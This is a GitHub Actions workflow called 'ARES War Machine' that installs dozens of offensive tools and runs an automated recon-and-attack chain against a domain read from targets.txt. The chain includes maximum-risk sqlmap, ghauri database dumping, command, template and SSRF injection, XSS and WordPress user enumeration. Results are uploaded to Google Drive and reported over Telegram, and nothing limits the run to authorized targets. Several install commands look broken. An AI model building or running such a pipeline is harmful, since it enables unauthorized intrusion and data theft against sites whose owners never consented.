name: ARES War Machine - TOTAL ARSENAL FINALITY
on:
  workflow_dispatch:

jobs:
  security-hunt:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout Repo
        uses: actions/checkout@v4

      - name: "Direct-Binary Arsenal Setup (60+ Tools)"
        run: |
          sudo apt-get update
          sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git libpcap-dev ruby-full chromium chromium-driver xvfb libcurl4-openssl-dev libxml2-dev libxslt1-dev
          
          mkdir -p $HOME/bin $HOME/tools output/recon output/probing output/screenshots output/crawling output/secrets output/vulns output/fuzzing output/specialized wordlists
          echo "$HOME/bin" >> $GITHUB_PATH
          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
          
          # 1. ELITE INSTALLERS
          sudo gem install wpscan || true
          pip3 install --upgrade pip
          pip3 install google-api-python-client google-auth-oauthlib google-auth-httplib2
          
          # Every tool you demanded
          pip3 install sqlmap arjun wfuzz gitleaks trufflehog prowler commix ghauri nosqlmap waymore jsluice jwt_tool secretfinder cloudsplaining tplmap xsstrike paramspider corsy crlfsuite s3scanner trivy checkov semgrep graphqlmap inql sstimap ssrfmap openredirex droopescan cmsmap playwright recon-ng gopherus s3scanner cloudsploit scoutsuite || true
          python3 -m playwright install chromium || true

          # 2. GO ARSENAL (2026 Strict Versions)
          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest || true
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest || true
          go install -v github.com/projectdiscovery/katana/cmd/katana@latest || true
          go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest || true
          go install -v github.com/hahwul/dalfox/v2@latest || true
          go install -v github.com/ffuf/ffuf@latest || true
          go install -v github.com/sensepost/gowitness@latest || true
          go install -v github.com/jaeles-project/jaeles@latest || true
          go install -v github.com/tomnomnom/assetfinder@latest || true
          go install -v github.com/tomnomnom/httprobe@latest || true
          go install -v github.com/jaeles-project/gospider@latest || true
          go install -v github.com/Emoe/kxss@latest || true

          # 3. SIGNATURES & REPOS
          jaeles config init && git clone --depth 1 https://github.com/jaeles-project/jaeles-signatures.git $HOME/.jaeles/signatures-base || true
          git clone https://github.com/m4ll0k/SecretFinder.git $HOME/tools/SecretFinder && pip3 install -r $HOME/tools/SecretFinder/requirements.txt || true

      - name: "ARES Execution & Per-Stage Organized Sync"
        env:
          CLIENT_ID: ${{ secrets.GOOGLE_CLIENT_ID }}
          CLIENT_SECRET: ${{ secrets.GOOGLE_CLIENT_SECRET }}
          REFRESH_TOKEN: ${{ secrets.GOOGLE_REFRESH_TOKEN }}
          PARENT_FOLDER_ID: "1kkJnI4qtvfYukua8F1uzoimQyxBlBsWM"
          TELEGRAM_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          TARGET=$(head -n 1 targets.txt)
          send_msg() { curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" -d chat_id="$TELEGRAM_CHAT_ID" -d parse_mode="Markdown" -d text="$1"; }
          
          cat << 'EOF' > oauth_upload.py
          import os, sys
          from google.oauth2.credentials import Credentials
          from googleapiclient.discovery import build
          from googleapiclient.http import MediaFileUpload
          def get_or_create_folder(service, name, parent):
              q=f"name='{name}' and '{parent}' in parents and trashed=false"
              r=service.files().list(q=q,fields="files(id)").execute().get("files",[])
              if r: return r[0]["id"]
              return service.files().create(body={"name":name,"mimeType":"application/vnd.google-apps.folder","parents":[parent]},fields='id').execute().get('id')
          def upload(f_path, parent_id, tool_name):
              if not os.path.exists(f_path) or os.path.getsize(f_path) == 0: return
              creds = Credentials(None, refresh_token=os.environ['REFRESH_TOKEN'], token_uri="https://oauth2.googleapis.com/token", client_id=os.environ['CLIENT_ID'], client_secret=os.environ['CLIENT_SECRET'])
              service = build("drive", "v3", credentials=creds)
              tool_folder_id = get_or_create_folder(service, tool_name, parent_id)
              meta = {"name": os.path.basename(f_path), "parents": [tool_folder_id]}
              media = MediaFileUpload(f_path, resumable=True)
              service.files().create(body=meta, media_body=media).execute()
          if __name__ == "__main__":
              upload(sys.argv[1], sys.argv[2], sys.argv[3])
          EOF

          send_msg "☢️ *ARES:* TOTAL ARSENAL FINALITY Engaged on \`$TARGET\`"

          # 1. STAGE: RECON (Subfinder + Assetfinder + Recon-ng + Takeover)
          subfinder -d $TARGET -all -recursive -o output/recon/subfinder.txt || true
          assetfinder --subs-only $TARGET >> output/recon/assetfinder.txt || true
          recon-ng -m recon/domains-hosts/brute_hosts -c "options set SOURCE $TARGET; run; exit" > output/recon/recon-ng.txt || true
          sort -u output/recon/*.txt > output/recon/all_subs.txt
          zip -j recon.zip output/recon/* && python3 oauth_upload.py "recon.zip" "$PARENT_FOLDER_ID" "Stage_1_Recon"

          # 2. STAGE: PROBING & VISUAL (Fixed httpx syntax + gowitness)
          httpx -list output/recon/all_subs.txt -status-code -title -ip -tech-detect -silent -o output/probing/live.txt || true
          [ ! -s output/probing/live.txt ] && echo "https://$TARGET" > output/probing/live.txt
          xvfb-run gowitness scan file -f output/probing/live.txt --screenshot-path output/screenshots/ || true
          zip -r visual.zip output/screenshots/ output/probing/live.txt && python3 oauth_upload.py "visual.zip" "$PARENT_FOLDER_ID" "Stage_2_Visual"

          # 3. STAGE: CRAWLING (Katana + Waymore + Gospider + Jsluice)
          katana -list output/probing/live.txt -depth 10 -jc -o output/crawling/katana.txt || true
          python3 -m waymore -i $TARGET -mode U -oU output/crawling/waymore.txt || true
          gospider -s "https://$TARGET" -d 3 -o output/crawling/ || true
          grep "?" output/crawling/katana.txt > output/crawling/params.txt || true
          zip -r crawl.zip output/crawling/* && python3 oauth_upload.py "crawl.zip" "$PARENT_FOLDER_ID" "Stage_3_Crawling"

          # 4. STAGE: INJECTIONS (SQLMap + Ghauri + SSTImap + SSRFmap + Commix + NoSQLMap)
          [ -s output/crawling/params.txt ] && sqlmap -m output/crawling/params.txt --batch --level 5 --risk 3 > output/vulns/sqlmap.txt || true
          [ -s output/crawling/params.txt ] && ghauri -m output/crawling/params.txt --batch --dbs > output/vulns/ghauri.txt || true
          sstimap -u "https://$TARGET" --batch > output/vulns/sstimap.txt || true
          ssrfmap -u "https://$TARGET" > output/vulns/ssrfmap.txt || true
          commix --url="https://$TARGET" --batch > output/vulns/commix.txt || true
          tplmap -u "https://$TARGET" --batch > output/vulns/tplmap.txt || true
          zip -j inj.zip output/vulns/* && python3 oauth_upload.py "inj.zip" "$PARENT_FOLDER_ID" "Stage_4_Injections"

          # 5. STAGE: WEB VULNS (Nuclei + Jaeles + Dalfox + XSStrike + Corsy + CRLFsuite + OpenRedirex)
          nuclei -list output/probing/live.txt -severity critical,high,medium -json-export output/vulns/nuclei.json || true
          jaeles scan -u "https://$TARGET" -s $HOME/.jaeles/signatures-base/ -o output/vulns/jaeles/ || true
          dalfox file output/crawling/katana.txt --output output/vulns/dalfox.txt || true
          python3 -m xsstrike -u "https://$TARGET" --timeout 10 --skip > output/vulns/xsstrike.txt || true
          python3 -m corsy -u "https://$TARGET" > output/vulns/corsy.txt || true
          python3 -m crlfsuite -u "https://$TARGET" > output/vulns/crlf.txt || true
          zip -r web.zip output/vulns/* && python3 oauth_upload.py "web.zip" "$PARENT_FOLDER_ID" "Stage_5_Web_Vulns"

          # 6. STAGE: SECRETS & CLOUD (Trufflehog + WPScan + S3Scanner + GraphQL + CMSmap)
          python3 -m trufflehog filesystem . > output/secrets/truffle.txt || true
          wpscan --url "https://$TARGET" --enumerate p,t,u --format cli > output/specialized/wpscan.txt || true
          s3scanner --bucket $(echo $TARGET | tr '.' '-') > output/specialized/s3.txt || true
          graphqlmap -u "https://$TARGET/graphql" > output/specialized/graphql.txt || true
          cmsmap https://$TARGET > output/specialized/cmsmap.txt || true
          zip -r final.zip output/secrets/ output/specialized/ && python3 oauth_upload.py "final.zip" "$PARENT_FOLDER_ID" "Stage_6_Final"

          send_msg "✅ *ARES:* TOTAL ARSENAL COMPLETE. Check your Drive folders."
